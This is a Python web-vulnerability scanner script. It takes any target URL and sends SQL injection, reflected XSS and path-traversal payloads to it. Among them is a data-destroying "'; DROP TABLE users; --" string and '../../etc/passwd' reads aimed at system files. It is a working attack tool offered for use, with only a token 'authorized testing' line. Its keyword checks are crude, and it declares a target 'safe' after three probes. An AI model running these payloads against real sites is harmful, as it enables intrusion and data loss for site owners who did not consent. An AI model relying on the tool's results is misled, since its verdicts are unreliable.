#!/usr/bin/env python3
# BUG HUNTER – ALL IN ONE SUITE
# coding by Mamun
# Thanks for using our tools 👋
# Educational & Authorized Testing Only

import requests
import time
import sys
import json
import threading
from datetime import datetime

# ---------------- COLORS ----------------
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[0m"
M = "\033[95m"

# ---------------- BANNER ----------------
def banner():
    print(C + r"""
██████╗ ██╗   ██╗ ██████╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
██╔══██╗██║   ██║██╔════╝     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝
██████╔╝██║   ██║██║  ███╗    ███████║██║   ██║██╔██╗ ██║   ██║
██╔══██╗██║   ██║██║   ██║    ██╔══██║██║   ██║██║╚██╗██║   ██║
██████╔╝╚██████╔╝╚██████╔╝    ██║  ██║╚██████╔╝██║ ╚████║   ██║
╚═════╝  ╚═════╝  ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝
""" + W)
    print(Y + "        BUG HUNTER – ALL-IN-ONE SUITE" + W)
    print(G + "               coding by Mamun" + W)
    print(M + "        Thanks for using our tools 👋" + W)
    print("-" * 60)

# ---------------- SPINNER ----------------
spinner_running = False
def spinner(text="Scanning"):
    global spinner_running
    spinner_running = True
    spin = "|/-\\"
    i = 0
    while spinner_running:
        sys.stdout.write(f"\r{C}{text}... {spin[i % 4]}{W}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 40 + "\r")

# ---------------- REPORT ----------------
results = []

def save_report():
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    txt_name = f"report_{ts}.txt"
    json_name = f"report_{ts}.json"

    with open(txt_name, "w") as f:
        for r in results:
            f.write(f"{r}\n")

    with open(json_name, "w") as f:
        json.dump(results, f, indent=4)

    print(G + f"[+] Report saved: {txt_name}, {json_name}" + W)

# ---------------- SQLi ----------------
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 'x'='x",
    "'; DROP TABLE users; --"
]

SQL_ERRORS = ["sql", "syntax", "mysql", "warning", "odbc", "sqlite"]

def sqli_test(url):
    print(Y + "\n[ SQL Injection Test ]" + W)
    t = threading.Thread(target=spinner, args=("Testing SQLi",))
    t.start()

    found = False
    for p in SQL_PAYLOADS:
        try:
            r = requests.get(url, params={"id": p}, timeout=10)
            for e in SQL_ERRORS:
                if e in r.text.lower():
                    found = True
                    results.append({
                        "type": "SQLi",
                        "payload": p,
                        "url": r.url,
                        "reason": "SQL error message detected"
                    })
        except:
            pass

    global spinner_running
    spinner_running = False
    t.join()

    if found:
        print(R + "[!] SQL Injection Possible" + W)
        print(C + "Explanation: Error-based SQL messages found in response." + W)
    else:
        print(G + "[✓] No SQLi detected" + W)

# ---------------- XSS ----------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>"
]

def xss_test(url):
    print(Y + "\n[ XSS Test ]" + W)
    t = threading.Thread(target=spinner, args=("Testing XSS",))
    t.start()

    found = False
    for p in XSS_PAYLOADS:
        try:
            r = requests.get(url, params={"q": p}, timeout=10)
            if p in r.text:
                found = True
                results.append({
                    "type": "XSS",
                    "payload": p,
                    "url": r.url,
                    "reason": "Payload reflected without sanitization"
                })
        except:
            pass

    global spinner_running
    spinner_running = False
    t.join()

    if found:
        print(R + "[!] XSS Possible" + W)
        print(C + "Explanation: Input reflected directly in response." + W)
    else:
        print(G + "[✓] No XSS detected" + W)

# ---------------- LFI ----------------
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../etc/passwd"
]

def lfi_test(url):
    print(Y + "\n[ LFI Test ]" + W)
    t = threading.Thread(target=spinner, args=("Testing LFI",))
    t.start()

    found = False
    for p in LFI_PAYLOADS:
        try:
            r = requests.get(url, params={"file": p}, timeout=10)
            if "root:x" in r.text:
                found = True
                results.append({
                    "type": "LFI",
                    "payload": p,
                    "url": r.url,
                    "reason": "/etc/passwd content detected"
                })
        except:
            pass

    global spinner_running
    spinner_running = False
    t.join()

    if found:
        print(R + "[!] LFI Possible" + W)
        print(C + "Explanation: Sensitive file content exposed." + W)
    else:
        print(G + "[✓] No LFI detected" + W)

# ---------------- MAIN ----------------
def main():
    banner()
    url = input(B + "Enter target URL (with parameter page): " + W).strip()

    sqli_test(url)
    xss_test(url)
    lfi_test(url)

    if results:
        save_report()
    else:
        print(G + "\nNo vulnerabilities found. Target looks safe." + W)

    print(Y + "\nScan finished. Press Enter to exit." + W)
    input()

if __name__ == "__main__":
    main()
